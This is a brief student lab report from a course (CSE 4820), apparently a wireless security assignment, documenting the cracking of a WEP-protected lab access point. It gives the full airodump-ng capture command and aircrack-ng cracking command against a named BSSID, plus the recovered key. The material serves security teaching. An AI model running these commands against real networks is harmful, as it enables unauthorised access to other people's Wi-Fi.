# CSE 4820

### Grant Butler, Jerrel Gordon


<div class="pageBreak"></div>

#### Task 1:
##### a: Find AP with WEP

FITSec-Target-2 has WEP

Using this command to capture a cap file:

```bash
sudo airodump-ng -c 9 --bssid 00:0F:66:89:B5:ED -w wep-attack wlan0mon
```

We should have been able to crack it with this:
```bash
sudo aircrack-ng -b 00:0F:66:89:B5:ED wep-attack-01.cap
```


`KEY FOUND! [ DE:FE:4D:53:00 ]`
